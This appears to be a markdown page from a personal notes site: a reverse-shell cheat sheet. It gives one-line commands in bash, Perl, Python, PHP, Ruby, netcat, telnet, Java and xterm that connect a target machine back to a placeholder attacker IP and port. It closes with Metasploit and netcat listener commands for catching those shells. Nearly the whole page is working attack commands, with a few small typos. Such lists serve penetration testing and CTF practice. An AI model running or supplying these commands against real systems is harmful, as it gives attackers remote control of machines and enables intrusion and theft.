---
layout: default
title: shells
tags:
    - bash
    - java
    - netcat
    - nc
    - perl
    - php
    - python
    - reverse
    - ruby
    - telnet
    - xterm
---
# shells

### Reverse Shells
Bash

`bash -i >& /dev/tcp/<attackerip>/<attacherport> 0>&1`

`0<&196;exec 196<>/dev/tcp/<attackerip>/<attackerport>; sh <&196 >&196 2>&19`

`exec 5<>/dev/tcp/<attackerip>/<attackerport>
cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
while read line 0<&5; do $line 2>&5 >&5; done`

`exec 5<>/dev/tcp/<attackerip>/<attackerport>; cat <&5 | while read line; do $line 2>&5 >&5; done`

Perl

`perl -e 'use Socket;$i="<attackerip>";$p=<attackerport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<attackerip>:<attackerport>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` _(no /bin/sh)_

`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attackerip>:<attackerport>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` _(Windows)_

Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attackerip>",<attackerport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

PHP

`php -r '$sock=fsockopen("<attackerip>",<attackerport>);exec("/bin/sh -i <&3 >&3 2>&3");'`

Ruby

`ruby -rsocket -e'f=TCPSocket.open("<attackerip>",<attackerport>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` _(no /bin/sh)_

`ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` _(Windows)_

Netcat

`nc -e /bin/sh <attackerip> <attackerport>`

`/bin/sh | nc <attackerip> <attackerport>`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> <attackerport> >/tmp/f` _(no `-e` flag)_

Telnet

`rm -f /tmp/p; mknod /tmp/p p && telnet <attackerip> <attackerport> 0/tmp/p`

`telnet <attackerip> <attackerport1> | /bin/bash | telnet <attackerip> <attackerport2>` _(locally listen on attackerport2)_

Java

`r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attackerip>/<attackerport>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()`

xterm

`xterm -display <attackerip>:1` _(port 6001)_

- Locally, to catch the incoming session on port 6001 `Xnest :1`
- Locally, to authorise the target's connection `xhost +<targetip>`

### Catching Shells
Metasploit

`use exploit/multi/handler`

Netcat

`nc -lvnp <attackerport>` _(can use `-vv`/`-vvv` to debug with extra verbosity)_

